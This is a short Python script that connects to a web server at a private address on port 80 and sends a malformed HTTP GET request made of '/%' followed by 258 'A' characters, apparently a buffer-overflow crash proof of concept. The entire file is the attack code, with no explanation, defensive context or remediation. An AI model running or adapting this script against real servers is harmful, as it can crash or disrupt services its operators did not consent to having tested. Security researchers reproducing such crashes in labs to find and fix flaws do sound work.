#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=80

badbuffer = "\x41" * 258
httpmethod = "GET"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

